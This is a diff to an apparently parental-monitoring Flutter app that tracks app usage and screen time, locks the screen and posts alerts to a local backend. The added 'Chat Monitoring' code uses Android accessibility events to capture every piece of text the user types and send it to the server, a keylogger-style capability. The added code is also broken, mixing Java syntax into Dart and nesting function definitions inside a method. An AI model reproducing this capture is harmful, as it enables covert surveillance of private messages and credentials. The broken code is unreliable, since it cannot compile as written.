@@ -6,6 +6,7 @@ import 'dart:async';
 import 'dart:convert';
 import 'package:http/http.dart' as http;
 import 'lockScreen.dart';
+import 'package:accessibility_service/accessibility_service.dart';
 
 class WatcherScreen extends StatefulWidget {
   int screen_limit = 0;
@@ -14,9 +15,12 @@ class WatcherScreen extends StatefulWidget {
   _WatcherScreenState createState() => _WatcherScreenState();
 }
 
-// APP MOnitoring 
+
 
 class _WatcherScreenState extends State<WatcherScreen> {
+
+  // APP MOnitoring
+
   Future<void> checkPermission() async {
     bool? granted = await UsageStats.checkUsagePermission();
     if (granted != true) {
@@ -45,7 +49,7 @@ class _WatcherScreenState extends State<WatcherScreen> {
         packageName.startsWith("com.google.android");
   }
 
-  // Screen Time MOnitoring 
+  // Screen Time MOnitoring
 
   int calculateTotalUsage(List<Map<String, dynamic>> apps) {
     int totalSeconds = 0;
@@ -75,6 +79,24 @@ class _WatcherScreenState extends State<WatcherScreen> {
       }
     });
 
+    // Chat Monitoring 
+    void startMonitoring() async {
+  bool enabled =
+      await AccessibilityService.isAccessibilityPermissionEnabled();
+
+  if (!enabled) {
+    AccessibilityService.openAccessibilitySettings();
+  }
+}
+
+
+  void onAccessibilityEvent(AccessibilityEvent event) {
+    if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+        CharSequence text = event.getText().toString();
+        sendToBackend(text);
+    }
+}
+
     sendToBackend(filteredData);
     int totalUsageMinutes = calculateTotalUsage(filteredData);
 
@@ -101,9 +123,9 @@ class _WatcherScreenState extends State<WatcherScreen> {
 
     print(response.statusCode);
   }
-  
-  // Alert MEchanism  
-  
+
+  // Alert MEchanism
+
   void triggerAlert(String type, String message) async {
     var response = await http.post(
       Uri.parse("http://10.27.190.96:8000/sendalert/"),
@@ -111,11 +133,11 @@ class _WatcherScreenState extends State<WatcherScreen> {
     );
   }
 
-  void showLocKScreen(){
+  void showLocKScreen() {
     Navigator.pushReplacement(
-          context,
-          MaterialPageRoute(builder: (context) => lockScreen()),
-        );
+      context,
+      MaterialPageRoute(builder: (context) => lockScreen()),
+    );
   }
 
   @override
